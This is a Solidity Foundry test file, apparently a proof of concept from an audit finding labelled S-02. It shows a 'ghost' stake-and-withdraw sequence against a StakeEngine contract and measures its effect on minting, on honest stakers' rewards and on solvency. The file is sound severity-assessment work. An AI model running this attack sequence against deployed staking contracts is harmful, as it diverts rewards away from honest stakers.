// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/StakeEngine.sol";
import "./mocks/MockVSP.sol";
import "./mocks/MockProtocolPolicy.sol";

/// S-02 SEVERITY TEST — is this misrouting (Medium) or over-minting/theft (higher)?
///
/// Three questions the severity rating depends on:
///   Q1: does the ghost make the protocol mint MORE total VSP? (inflation vs redistribution)
///   Q2: do honest stakers end up WORSE OFF in absolute terms? (loss vs dilution)
///   Q3: does the engine stay solvent? (theft vs misallocation)
contract S02SeverityPoC is Test {
    MockVSP vsp;
    MockProtocolPolicy policy;
    uint256 constant POST = 7;
    uint256 constant DEPLOY_RATE_MAX = 693805319167998976;
    uint256 constant BIG = 1000e18;
    uint256 constant N_HONEST = 10;

    address attacker = address(0xA77AC7E2);

    function _build() internal returns (StakeEngine eng) {
        vsp = new MockVSP();
        policy = new MockProtocolPolicy(0);
        policy.setRates(0, DEPLOY_RATE_MAX);
        eng = StakeEngine(
            address(
                new ERC1967Proxy(
                    address(new StakeEngine(address(0))),
                    abi.encodeCall(StakeEngine.initialize, (address(this), address(vsp), address(policy)))
                )
            )
        );
        vsp.mint(address(this), 1e30);
        vsp.approve(address(eng), type(uint256).max);
    }

    function _fund(StakeEngine eng, address who, uint256 amt) internal {
        vsp.mint(who, amt);
        vm.prank(who);
        vsp.approve(address(eng), type(uint256).max);
    }

    struct Result {
        uint256 totalSupplyBefore;
        uint256 totalSupplyAfter;
        uint256 minted;
        uint256 attackerGain;
        uint256 honestGainSum;
        uint256 firstHonestGain;
        uint256 engineBal;
        uint256 claims;
        bool solvent;
    }

    function _scenario(bool useGhost) internal returns (Result memory r) {
        vm.warp(86400 * 1000);
        StakeEngine eng = _build();

        if (useGhost) {
            _fund(eng, attacker, 1);
            vm.prank(attacker);
            eng.stake(POST, 0, 1);
            vm.prank(attacker);
            eng.withdraw(POST, 0, 1, true);
        }

        for (uint256 i = 0; i < N_HONEST; i++) {
            address h = address(uint160(0x5000 + i));
            _fund(eng, h, BIG);
            vm.prank(h);
            eng.stake(POST, 0, BIG);
        }

        _fund(eng, attacker, BIG);
        vm.prank(attacker);
        eng.stake(POST, 0, BIG);

        address chal = address(0xBEEF);
        _fund(eng, chal, 1);
        vm.prank(chal);
        eng.stake(POST, 1, 1);

        r.totalSupplyBefore = vsp.totalSupply();

        vm.warp(block.timestamp + 30 days);
        eng.updatePost(POST);

        r.totalSupplyAfter = vsp.totalSupply();
        r.minted = r.totalSupplyAfter - r.totalSupplyBefore;

        r.attackerGain = eng.getUserStake(attacker, POST, 0) - BIG;
        for (uint256 i = 0; i < N_HONEST; i++) {
            address h = address(uint160(0x5000 + i));
            uint256 g = eng.getUserStake(h, POST, 0) - BIG;
            r.honestGainSum += g;
            if (i == 0) {
                r.firstHonestGain = g;
            }
        }

        (uint256 s, uint256 c) = eng.getPostTotals(POST);
        r.claims = s + c;
        r.engineBal = vsp.balanceOf(address(eng));
        r.solvent = r.engineBal >= r.claims;
    }

    function test_S02_Severity() public {
        Result memory a = _scenario(true);
        Result memory b = _scenario(false);

        emit log("=== Q1: total minted (inflation?) ===");
        emit log_named_uint("minted WITH ghost", a.minted);
        emit log_named_uint("minted WITHOUT ghost", b.minted);

        emit log("=== Q2: honest staker outcomes (absolute loss?) ===");
        emit log_named_uint("honest gain SUM with ghost", a.honestGainSum);
        emit log_named_uint("honest gain SUM without ghost", b.honestGainSum);
        emit log_named_uint("first honest gain with ghost", a.firstHonestGain);
        emit log_named_uint("first honest gain without ghost", b.firstHonestGain);

        emit log("=== attacker ===");
        emit log_named_uint("attacker gain with ghost", a.attackerGain);
        emit log_named_uint("attacker gain without ghost", b.attackerGain);

        emit log("=== Q3: solvency ===");
        emit log_named_uint("claims with ghost", a.claims);
        emit log_named_uint("engine bal with ghost", a.engineBal);
        assertTrue(a.solvent, "engine solvent in ghost scenario");
        assertTrue(b.solvent, "engine solvent in clean scenario");

        // Report whether honest stakers lost absolutely
        if (a.honestGainSum < b.honestGainSum) {
            emit log_named_uint("honest stakers LOST (absolute)", b.honestGainSum - a.honestGainSum);
        } else {
            emit log_named_uint("honest stakers gained MORE with ghost", a.honestGainSum - b.honestGainSum);
        }
    }
}
